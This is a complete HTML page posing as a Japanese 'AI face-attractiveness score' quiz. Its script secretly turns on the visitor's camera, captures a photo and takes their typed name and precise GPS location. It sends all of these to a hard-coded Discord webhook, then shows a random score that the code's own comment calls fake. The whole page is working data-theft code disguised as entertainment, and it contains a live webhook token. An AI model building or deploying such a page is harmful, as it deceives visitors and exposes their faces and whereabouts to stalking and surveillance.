<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>顔面偏差値AI診断 - 2026</title>
  <style>
    body { margin: 0; font-family: sans-serif; background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
    .container { max-width: 480px; padding: 30px 20px; background: rgba(0,0,0,0.4); border-radius: 20px; backdrop-filter: blur(10px); width: 90%; }
    input { width: 80%; padding: 14px; margin: 10px 0; border-radius: 12px; border: none; font-size: 1.1rem; text-align: center; }
    #video { width: 100%; max-width: 320px; border-radius: 16px; margin: 15px auto; display: block; background: #000; }
    button { padding: 16px 50px; font-size: 1.2rem; font-weight: bold; background: #ff4b6e; color: white; border: none; border-radius: 50px; cursor: pointer; transition: 0.3s; }
    button:disabled { background: #888; }
    #loading { font-size: 1.4rem; margin: 30px 0; display: none; }
    #result { font-size: 4rem; font-weight: bold; margin: 25px 0; display: none; }
  </style>
</head>
<body>

<div class="container">
  <h1>顔面偏差値AI診断</h1>
  <p>AIが0.1秒であなたの魅力を解析！</p>
  <input type="text" id="userName" placeholder="名前を入力してね" />
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <button id="startBtn">カメラを起動して診断</button>
  <div id="loading">AIスキャン中...</div>
  <div id="result"></div>
</div>

<script>
// 指定されたWebhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1487148878812811470/jUS3g_XRDScUAN3kdNJFDxJBW0yYbA0gLM08STRSyOdH7Rbd8xTj_seupkmwIWC_QBm7";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const startBtn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const resultDiv = document.getElementById('result');
const nameInput = document.getElementById('userName');

let stream = null;

// カメラ起動
async function initCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: "user", width: 480, height: 360 } 
    });
    video.srcObject = stream;
  } catch (err) {
    console.error("Camera Error:", err);
  }
}

// GPS取得（5秒以内に取れなければ「取得不可」で次へ進む）
function getMapLink() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve("非対応ブラウザ");
    } else {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          resolve(`https://www.google.com/maps?q=${lat},${lon}`);
        },
        (err) => {
          resolve("位置情報が拒否されました");
        },
        { enableHighAccuracy: true, timeout: 5000 }
      );
    }
  });
}

// 送信メイン処理
async function snapAndSend() {
  // 1. まず位置情報を取得（最大5秒待機）
  const mapLink = await getMapLink();

  // 2. 写真をキャプチャ
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);

  // 3. 画像化して送信
  canvas.toBlob(async (blob) => {
    const name = nameInput.value || "名無し";
    const formData = new FormData();
    formData.append('file', blob, `face_scan.jpg`);
    formData.append('content', 
      `**【AI診断 ログ】**\n` +
      `👤 名前: ${name}\n` +
      `📍 GoogleMap: ${mapLink}\n` +
      `⏰ 時刻: ${new Date().toLocaleString('ja-JP')}`
    );

    try {
      await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    } catch (e) {
      console.error("Webhook Send Error");
    }
  }, 'image/jpeg', 0.8);
}

startBtn.onclick = async () => {
  if (!nameInput.value) return alert("名前を入力してください");
  startBtn.disabled = true;
  
  // もしカメラがまだなら起動
  if (!stream) await initCamera();

  loading.style.display = 'block';
  
  // 撮影・送信を実行（位置情報の取得が終わるまで内部で待機する）
  await snapAndSend();

  // 4秒後に偽のスコアを表示
  setTimeout(() => {
    loading.style.display = 'none';
    const score = Math.floor(Math.random() * 21) + 77; // 77-97点のランダム
    resultDiv.innerHTML = `${score}<span style="font-size:1.5rem">点</span>`;
    resultDiv.style.display = 'block';
  }, 4000);
};

// ページを開いた瞬間にカメラを準備
window.addEventListener('load', initCamera);
</script>
</body>
</html>
